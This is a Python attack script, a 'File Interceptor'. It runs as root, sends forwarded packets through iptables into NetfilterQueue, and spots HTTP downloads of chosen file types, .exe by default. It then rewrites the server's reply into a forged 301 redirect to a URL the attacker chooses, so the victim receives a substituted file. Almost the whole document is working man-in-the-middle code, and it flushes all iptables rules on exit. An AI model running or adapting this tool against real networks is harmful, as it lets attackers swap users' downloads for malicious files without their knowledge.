#!/usr/bin/env python3
import sys, os, subprocess, time, argparse

try:
    import scapy.all as scapy
    from netfilterqueue import NetfilterQueue
except ImportError as e:
    print("\n[-] Dependency Error: Virtual Environment missing or incomplete.")
    print(f"    Specific missing module: {e}")
    print("\n[*] Please follow these steps to fix the environment:")
    print("\n    1. Create the virtual environment in the parent directory:")
    print("       python3 -m venv myvenv")
    print("\n    2. Activate it and install the required tools:")
    print("       source myvenv/bin/activate")
    print("       pip install scapy NetfilterQueue")
    print("\n    3. Run the script using the specific venv python path:")
    print("       sudo ../myvenv/bin/python3 file_interceptor.py\n")
    
    sys.exit()

def root_check():
    if os.geteuid() != 0:
        sys.exit("[!] This script must run as root")
    else:
        print("[*] Welcome to the File Interceptor.")


def iptable_insert():
    try:
        subprocess.run(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
        '''
        or
        subprocess.run(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
        subprocess.run(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
        '''
        print("[*] Iptables intercepting rule inserted")
    except Exception as e:
        print(f"[!] Error inserting iptables rule: {e}")

def iptable_flush():
    try:
        subprocess.run(['iptables', '--flush'], check=True)
        print("[*] Iptables rules flushed")
    except Exception as e:
        print(f"[!] Error flushing iptables: {e}")

def parse_args():
    parser = argparse.ArgumentParser(description="File Interceptor Tool")
    parser.add_argument('-e', '--extension', required=False, default=".exe", help="File extensions to replace separated by commas (ex. .png,.jpg)")
    parser.add_argument('-u', '--url', required=True, help="URL to the file to replace with (ex. https://192.168.1.50)")
    return parser.parse_args()


def process_packet(packet, extensions_to_replace, file_destination):
    global packet_count
    global ack_dict
    packet_count += 1

    scapy_packet = scapy.IP(packet.get_payload())
    
    if scapy_packet.haslayer(scapy.Raw):
        # OUTGOING REQUEST Check for file download
        if scapy_packet[scapy.TCP].dport == 80: #Traffic supposed to flow through bettercap so 8080 proxy
            if any(ext.encode() in scapy_packet[scapy.Raw].load for ext in extensions_to_replace):
        
                # Check if the user is already requesting our spoof file. Convert file_destination to bytes for comparison
                if file_destination.encode() not in scapy_packet[scapy.Raw].load:
                    print(f"[+] File type {ext} download detected. Queuing redirect...")
                    ack_dict[scapy_packet[scapy.TCP].ack] = time.time()
                else:
                    print("[-] Ignoring request for our own file to prevent loop.")

        # INCOMING RESPONSE (Replace the file)
        elif scapy_packet[scapy.TCP].sport == 80:
            current_seq = scapy_packet[scapy.TCP].seq

            if current_seq in ack_dict:
                del ack_dict[current_seq]
                print(f"[+] Replacing file with: {file_destination}")

                #Forge the Response
                #We create a string first, then encode to bytes.
                redirect_header = (
                    "HTTP/1.1 301 Moved Permanently\r\n"
                    f"Location: {file_destination}\r\n"
                    "Content-Length: 0\r\n"
                    "Connection: close\r\n\r\n"
                )
                scapy_packet[scapy.Raw].load = redirect_header.encode()

                # Remove checksums so Scapy recalculates them
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].len
                del scapy_packet[scapy.TCP].chksum
                # Set the modified payload back to the netfilter packet
                packet.set_payload(bytes(scapy_packet))

    #Memory cleanup after every 500 packet
    if packet_count % 500 == 0:
        current_time = time.time()
        #Awsome list comprehension
        expired_keys = [k for k, v in ack_dict.items() if current_time - v > 10]
        for k in expired_keys:
            del ack_dict[k] 

    packet.accept()


if __name__ == "__main__":
    root_check()
    args = parse_args()
    extensions_to_trigger = args.extension.split(',')
    url_to_pull_from = args.url
    
    iptable_insert()

    # create the object, bind to the iptables command and run
    queue = NetfilterQueue()
    
    ack_dict = {}
    packet_count = 0

    try:
        queue.bind(1337, lambda packet: process_packet(packet, extensions_to_trigger, url_to_pull_from))
        try:
            print("[*] Starting packet interception. Press Ctrl+C to stop.")
            queue.run()
        except KeyboardInterrupt:
            print("\n[!] User Interruption detected. Exiting gracefully.")
        except Exception as e:
            print(f"[!] An error has occurred running NSQUEU: {e}")
    except Exception as e:
        print(f"[!] An error has occurred binding NSQUEU: {e}")
    finally:
        iptable_flush()